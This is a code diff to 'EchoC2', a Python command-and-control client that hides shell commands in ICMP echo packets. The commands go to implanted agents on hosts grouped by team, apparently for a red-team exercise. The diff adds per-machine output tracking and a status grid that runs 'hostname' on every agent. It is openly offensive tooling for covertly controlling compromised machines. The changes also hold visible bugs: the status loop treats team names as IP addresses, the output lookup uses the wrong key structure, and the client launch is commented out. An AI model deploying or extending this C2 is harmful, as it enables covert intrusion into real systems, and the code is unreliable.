@@ -13,6 +13,9 @@ import sys
 import os
 import time
 import argparse
+import re
+from itertools import zip_longest
+
 
 GREEN = "\033[92m"
 BLUE = "\033[94m"
@@ -33,21 +36,28 @@ PAYLOAD_SIZE = MAX_PACKET_SIZE - IP_HEADER_SIZE - ICMP_HEADER_SIZE
 FRAGMENT_HEADER_SIZE = 4
 FRAGMENT_SIZE = PAYLOAD_SIZE - FRAGMENT_HEADER_SIZE - len(RESPONSE_PREFIX)
 agent_ips = {
-    'Team1': {'Ubuntu1': '10.1.1.10', 'Ubuntu2': '10.1.1.20', 'DevServer': '10.1.1.30', 'SQLServer': '10.1.1.40'},
-    'Team2': {'Ubuntu1': '10.2.1.10', 'Ubuntu2': '10.2.1.20', 'DevServer': '10.2.1.30', 'SQLServer': '10.2.1.40'},
-    'Team3': {'Ubuntu1': '10.3.1.10', 'Ubuntu2': '10.3.1.20', 'DevServer': '10.3.1.30', 'SQLServer': '10.3.1.40'},
-    'Team4': {'Ubuntu1': '10.4.1.10', 'Ubuntu2': '10.4.1.20', 'DevServer': '10.4.1.30', 'SQLServer': '10.4.1.40'},
-    'Team5': {'Ubuntu1': '10.5.1.10', 'Ubuntu2': '10.5.1.20', 'DevServer': '10.5.1.30', 'SQLServer': '10.5.1.40'},
-    'Team6': {'Ubuntu1': '10.6.1.10', 'Ubuntu2': '10.6.1.20', 'DevServer': '10.6.1.30', 'SQLServer': '10.6.1.40'},
-    'Team7': {'Ubuntu1': '10.7.1.10', 'Ubuntu2': '10.7.1.20', 'DevServer': '10.7.1.30', 'SQLServer': '10.7.1.40'},
-    'Team8': {'Ubuntu1': '10.8.1.10', 'Ubuntu2': '10.8.1.20', 'DevServer': '10.8.1.30', 'SQLServer': '10.8.1.40'},
-    'Team9': {'Ubuntu1': '10.9.1.10', 'Ubuntu2': '10.9.1.20', 'DevServer': '10.9.1.30', 'SQLServer': '10.9.1.40'},
-    'Team10': {'Ubuntu1': '10.10.1.10', 'Ubuntu2': '10.10.1.20', 'DevServer': '10.10.1.30', 'SQLServer': '10.10.1.40'},
-    'Team11': {'Ubuntu1': '10.11.1.10', 'Ubuntu2': '10.11.1.20', 'DevServer': '10.11.1.30', 'SQLServer': '10.11.1.40'},
-    'Team12': {'Ubuntu1': '10.12.1.10', 'Ubuntu2': '10.12.1.20', 'DevServer': '10.12.1.30', 'SQLServer': '10.12.1.40'},
-    'Team13': {'Ubuntu1': '10.13.1.10', 'Ubuntu2': '10.13.1.20', 'DevServer': '10.13.1.30', 'SQLServer': '10.13.1.40'},
-    'Team14': {'Ubuntu1': '10.14.1.10', 'Ubuntu2': '10.14.1.20', 'DevServer': '10.14.1.30', 'SQLServer': '10.14.1.40'},
+    'Team1': {'Ubuntu1': '10.1.1.10', 'Ubuntu2': '10.1.1.20', 'DevServer': '10.1.1.30', 'WebApp': '10.1.1.40'},
+    'Team2': {'Ubuntu1': '10.2.1.10', 'Ubuntu2': '10.2.1.20', 'DevServer': '10.2.1.30', 'WebApp': '10.2.1.40'},
+    'Team3': {'Ubuntu1': '10.3.1.10', 'Ubuntu2': '10.3.1.20', 'DevServer': '10.3.1.30', 'WebApp': '10.3.1.40'},
+    'Team4': {'Ubuntu1': '10.4.1.10', 'Ubuntu2': '10.4.1.20', 'DevServer': '10.4.1.30', 'WebApp': '10.4.1.40'},
+    'Team5': {'Ubuntu1': '10.5.1.10', 'Ubuntu2': '10.5.1.20', 'DevServer': '10.5.1.30', 'WebApp': '10.5.1.40'},
+    'Team6': {'Ubuntu1': '10.6.1.10', 'Ubuntu2': '10.6.1.20', 'DevServer': '10.6.1.30', 'WebApp': '10.6.1.40'},
+    'Team7': {'Ubuntu1': '10.7.1.10', 'Ubuntu2': '10.7.1.20', 'DevServer': '10.7.1.30', 'WebApp': '10.7.1.40'},
+    'Team8': {'Ubuntu1': '10.8.1.10', 'Ubuntu2': '10.8.1.20', 'DevServer': '10.8.1.30', 'WebApp': '10.8.1.40'},  
+    'Team9': {'Ubuntu1': '10.9.1.10', 'Ubuntu2': '10.9.1.20', 'DevServer': '10.9.1.30', 'WebApp': '10.9.1.40'},
+    'Team10': {'Ubuntu1': '10.10.1.10', 'Ubuntu2': '10.10.1.20', 'DevServer': '10.10.1.30', 'WebApp': '10.10.1.40'},
+    'Team11': {'Ubuntu1': '10.11.1.10', 'Ubuntu2': '10.11.1.20', 'DevServer': '10.11.1.30', 'WebApp': '10.11.1.40'},
+    'Team12': {'Ubuntu1': '10.12.1.10', 'Ubuntu2': '10.12.1.20', 'DevServer': '10.12.1.30', 'WebApp': '10.12.1.40'},
+    'Team13': {'Ubuntu1': '10.13.1.10', 'Ubuntu2': '10.13.1.20', 'DevServer': '10.13.1.30', 'WebApp': '10.13.1.40'},
+    'Team14': {'Ubuntu1': '10.14.1.10', 'Ubuntu2': '10.14.1.20', 'DevServer': '10.14.1.30', 'WebApp': '10.14.1.40'},
+    'Team15': {'Ubuntu1': '10.15.1.10', 'Ubuntu2': '10.15.1.20', 'DevServer': '10.15.1.30', 'WebApp': '10.15.1.40'},
 }
+def find_team_machine_by_ip(agent_ips, target_ip):
+    for team, machines in agent_ips.items():
+        for machine, ip in machines.items():
+            if ip == target_ip:
+                return team, machine
+    return None, None
 
 def parse_machines(value):
     return [m.strip() for m in value.split(",") if m.strip()]
@@ -167,12 +177,18 @@ def receive_icmp_echo(icmp_socket, expected_id, timeout=TIMEOUT, max_responses=M
 def client(dest_addrs):
     icmp_id = os.getpid() & 0xFFFF
     seq = 0
+    machine_outputs = {}
 
     while True:
         command = input(f"{GREEN}EchoC2>{RESET} ")
         if command.lower() == 'exit':
             break
-        
+        if command.lower() == 'status':
+            display_status()
+        if command.lower().startswith('output'):
+            command = command.split(' ')
+            print(f"{BLUE}[*]{RESET} Output for {command[1]} {command[2]}:\n {machine_outputs[command[1]][command[2]]}")
+
         seq += 1
         full_command = COMMAND_PREFIX + command.encode()
         
@@ -180,6 +196,7 @@ def client(dest_addrs):
             icmp_socket, sent_id = send_icmp_echo(dest_addr, full_command, icmp_id, seq)
             responses = receive_icmp_echo(icmp_socket, sent_id, max_responses=2)
             icmp_socket.close()
+            team, machine = find_team_machine_by_ip(agent_ips, dest_addr)
 
             ack_response = None
             cmd_response = None
@@ -196,44 +213,102 @@ def client(dest_addrs):
                     log(f"Error processing response: {e}")
             
             if ack_response:
-                print(f"\n{BLUE}[*]{RESET} Command Acknowledgement for {dest_addr}:")
+                print(f"\n{BLUE}[*]{RESET} Command Acknowledgement for {team}{machine}:")
                 print(f"Server received: {ack_response}")
             else:
-                print(f"\n{RED}[WARN]{RESET} No command acknowledgement received for {dest_addr}")
+                print(f"\n{RED}[WARN]{RESET} No command acknowledgement received for {team}{machine}")
 
             if cmd_response:
-                print(f"\n{BLUE}[*]{RESET} Command Output from {dest_addr}:")
-                print(cmd_response)
+                print(f"\n{BLUE}[*]{RESET} Command Output from {team}{machine}:")
+                machine_outputs[dest_addr] = cmd_response
             else:
-                print(f"\n{RED}[WARN]{RESET} No command output received for {dest_addr}")
+                print(f"\n{RED}[WARN]{RESET} No command output received for {team}{machine}")
+                machine_outputs[dest_addr] = "No output"
             
             if not responses:
-                print(f"{RED}[WARN]{RESET} No valid responses received for {dest_addr}")
+                print(f"{RED}[WARN]{RESET} No valid responses received for {team}{machine}")
         
         print()  # Blank line for readability
 
+ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")
+
+
+def visible_len(s):
+    return len(ANSI_RE.sub("", s))
+
+
+def pad_ansi(s, width):
+    return s + " " * max(0, width - visible_len(s))
+
+
+def print_teams_in_columns(agent_ips, machine_responses, columns=3):
+    blocks = []
+
+    for team in agent_ips:
+        block = [f"{team}"]
+        for machine in agent_ips[team]:
+            color = GREEN if machine_responses.get(machine) else RED
+            block.append(f"  {color}{machine}{RESET}")
+        blocks.append(block)
+
+    col_width = max(visible_len(line) for block in blocks for line in block) + 4
+
+    for start in range(0, len(blocks), columns):
+        row_blocks = blocks[start:start + columns]
+        for lines in zip_longest(*row_blocks, fillvalue=""):
+            print("".join(pad_ansi(line, col_width) for line in lines))
+        print()
+
 def display_status():
-    print(f"{GREEN}Team X{RESET}")
+    command = "hostname"
+    icmp_id = os.getpid() & 0xFFFF
+    seq = 0
+    machine_responses = {}
+    for machine in agent_ips:
+        full_command = COMMAND_PREFIX + command.encode()
+        icmp_socket, sent_id = send_icmp_echo(machine, full_command, icmp_id, seq)
+        responses = receive_icmp_echo(icmp_socket, sent_id, max_responses=2)
+        icmp_socket.close()
+
+        ack_response = None
+        cmd_response = None
+        
+        for icmp_type, response in responses:
+            try:
+                if response.startswith(COMMAND_PREFIX):
+                    ack_response = response[len(COMMAND_PREFIX):].decode(errors='replace').strip()
+                elif response.startswith(RESPONSE_PREFIX):
+                    cmd_response = response[len(RESPONSE_PREFIX):].decode(errors='replace').strip()
+                else:
+                    log(f"Unexpected response format: {response[:50]}...")
+            except Exception as e:
+                log(f"Error processing response: {e}")
+        
+        if cmd_response:
+            machine_responses[machine] = cmd_response
+        else:
+            machine_responses[machine] = None
+        
+    print_teams_in_columns(agent_ips, machine_responses)
 
 if __name__ == "__main__":
     MAX_PACKET_SIZE = args.size
 
-    if not args.status and (args.teams is None or args.machines is None):
-        parser.error("--teams and --machines are required unless --status is set")
+    if args.teams is None or args.machines is None:
+        parser.error("--teams and --machines are required")
     
-    if args.status:
-        display_status()
-
-    targets = []
-    for team in args.teams:
-        for machine in args.machines:
-            targets.append(agent_ips[team][machine])
-    print("""
+    print(r"""
   _____     _            ____ ____  
  | ____|___| |__   ___  / ___|___ \ 
  |  _| / __| '_ \ / _ \| |     __) |
  | |__| (__| | | | (_) | |___ / __/ 
  |_____\___|_| |_|\___/ \____|_____|
                                     """)
+
+    # targets = []
+    # for team in args.teams:
+    #     for machine in args.machines:
+    #         targets.append(agent_ips[team][machine])
+
     print("Welcome to EchoC2. Use 'exit' to quit.\n")
-    client(args.target)
+    #client(args.target)
